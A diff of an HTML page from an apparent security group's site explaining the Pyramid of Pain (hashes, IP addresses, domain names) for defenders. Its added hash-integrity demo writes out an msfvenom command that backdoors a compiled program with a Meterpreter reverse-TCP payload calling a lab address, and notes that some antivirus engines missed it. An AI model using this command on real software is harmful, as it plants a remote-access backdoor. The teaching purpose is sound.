@@ -5,14 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="../src/css/global.css">
     <link rel="stylesheet" href="../src/css/papers.css">
-    <title>Pyramid Of Pain: a Cybersecurity Tool</title>
+    <title>4forward - Pyramid Of Pain: a Cybersecurity Tool</title>
 </head>
 <body>
     <nav class="nav">
         <a href="../index.html">[ Home ]</a>
         <a href="index.html">[ Papers ]</a>
         <a href="../members/index.html">[ Members ]</a>
-        <a href="https://github.com/4forward-secure" target="_blank">[ Github ]</a>
+        <a href="https://github.com/4forward-secure">[ Github ]</a>
     </nav>
 
     <main>
@@ -50,37 +50,77 @@ _______________________________¶¶¶¶¶¶¶</span>
 <h1>:: Pyramid Of Pain: a Cybersecurity Tool ::</h1>
 
 <div class="color-violet font-weight-700">
-═════ SUMMARY ════╗
-<b>[1]</b> Introduction
-<b>[2]</b> Hash Values
-<b>[3]</b> IP Addresses
-<b>[4]</b> Domain Names
-<b>[5]</b> Conclusion
-══════════════════╝
++------=SUMMARY=------+
+| <b>[01]</b> Introduction   |
+| <b>[02]</b> Hash Values    |
+| <b>[03]</b> IP Addresses   |
+| <b>[04]</b> Domain Names   |
+| <b>[05]</b> Conclusion     |
++---------------------+
 </div>
 
-<b>:: [1] Introduction</b>
+<b>[ Introduction ]</b>
 
 <p class="paragraph">The Pyramid of Pain is a famous conceptual tool in the field of cybersecurity. It helps security teams understand and prioritize the threats they face. In this paper, we will explore three main components of the pyramid: Hash Values, IP Addresses and Domain Names.</p>
 
-<b>:: [2] Hash Values</b>
+<b>[ Hash Values ]</b>
 
-<p class="paragraph">Hash values ​​are at the base of the pain pyramid. They are relatively easy to change and therefore don't cause much "pain" to attackers when they are discovered and blocked. However, even though they are low-level, they are still useful for detecting malicious activity, especially when combined with other information.</p>
+<p class="paragraph">Hash values, also known as hash values, are fixed and unique character sequences for each file, text, etc. Hash values are at the base of the pyramid of pain, and will be a great ally in verifying data integrity and checking for malware.</p>
+<p class="paragraph">Because they are at the bottom of the pyramid, hashes don't cause APTs much “pain” when they are discovered and blocked. However, even though they are low-level, they are still very useful.</p>
 
-<b>:: [3] IP Addresses</b>
+› Integrity ‹
+<div style="margin-left: 20px;">
+<p class="paragraph">To check the integrity of the data, I'll use a simple program I created in C++.</p>
++-------------------program.cpp-------------------+
+| #include &ltiostream&gt                             |
+|                                                 |
+| int main() {                                    |
+|   std::cout &lt&lt "Simple program." &lt&lt std::endl;  |
+|   return 0;                                     |
+| }                                               |
++-------------------------------------------------+
+
+<p class="paragraph">As the first step in this demonstration, I will compile my program and then generate the MD5 hash using the “md5sum” command.</p>
+<p class="paragraph">After generating the hash, I'll use msfvenom to generate the backdoor and infect my program. This way you can see that the hash of the original program is completely different from the hash of the infected program.</p>
+
++------------------------------=TERMINAL=-------------------------------+
+| <b class="color-red">blackcrw@4forward:~/$</b> g++ program.cpp -o program                      |
+| <b class="color-red">blackcrw@4forward:~/$</b> md5sum program                                  |
+| c401bd76aecd9bd018bd0272baf729c3  program                             |
+| <b class="color-red">blackcrw@4forward:~/$</b> msfvenom -x program \                           |
+| -p windows/x64/meterpreter/reverse_tcp lhost=172.17.0.2 lport=4444 \  |
+| R> program_infected                                                   |
+| <b class="color-red">blackcrw@4forward:~/$</b> md5sum program program_infected                 |
+| c401bd76aecd9bd018bd0272baf729c3  program                             |
+| 6a770327f49be5cbb9684ceb1307e504  program_infected                    |
++-----------------------------------------------------------------------+
+
+<p class="paragraph">Note that the hash from the original program to the infected program is completely different, and this means that the program has been altered, regardless of whether it was a comma or a period. We can no longer trust the integrity of the program, because it has been violated.</p>
+<p class="paragraph">It is for the purpose of verifying the integrity of the program that the hash of the original program is left available on the download page.</p>
+</div>
+› Hash search ‹
+<div style="margin-left: 20px;">
+<p class="paragraph">Once we have verified that integrity has been violated, we can use tools such as VírusTotal to perform a search on the hash of the infected program, in order to identify whether this hash has already been catalogued by another Blue Team, and when it was first detected.</p>
+<p class="paragraph">If it hasn't been catalogued by anyone, we can send you a sample of the infected program so that VírusTotal can test the malware in various antivirus programs.</p>
+<p class="paragraph"><a href="https://www.virustotal.com/gui/file/8580ec19859958f5b5aced230133521a5c37cb7d59e708b7ea02dcf6e5b33e90">https://www.virustotal.com/gui/file/8580ec19859958f5b5aced230133521a5c37cb7d59e708b7ea02dcf6e5b33e90</a></p>
+<p class="paragraph">Note that some antiviruses have defined our infected program as malware.</p>
+<p class="paragraph">Take this opportunity to evaluate the antiviruses that didn't detect the backdoor in our program. Remember that I didn't use any encoding method and they still didn't detect it.</p>
+</div>
+
+<b>[ IP Addresses ]</b>
 
 <p class="paragraph">IP addresses are one step above hash values ​​in the pyramid. IP addresses can provide information about the attacker's geographic location as well as the infrastructure used in the attack. However, just like hash values, IP addresses can also be easily changed or disguised by attackers.</p>
 
-<b>:: [4] Domain Names</b>
+<b>[ Domain Names ]</b>
 
 <p class="paragraph">Domain names are even higher up the pyramid and are more difficult to change than hash values ​​and IP addresses. Attackers often register their own domains to use in attacks, so discovering and blocking a malicious domain name can cause a significant amount of "pain" to the attacker.</p>
 
-<b>:: [5] Conclusion</b>
+<b>[ Conclusion ]</b>
 
 <p class="paragraph">The Pyramid of Pain is a valuable tool for cybersecurity teams as it helps prioritize defensive actions based on the level of "pain" each action will cause to the attacker. By understanding the components of the pyramid, security teams can craft more effective and focused strategies to protect their systems and data.</p>
 
 +-------------------+
-| <b>Github:</b> <a href="https://github.com/blackcrw" target="_blank">blackcrw</a>  |
+| <b>Github:</b> <a href="https://github.com/blackcrw">blackcrw</a>  |
 +-------------------+
         </pre>
     </main>
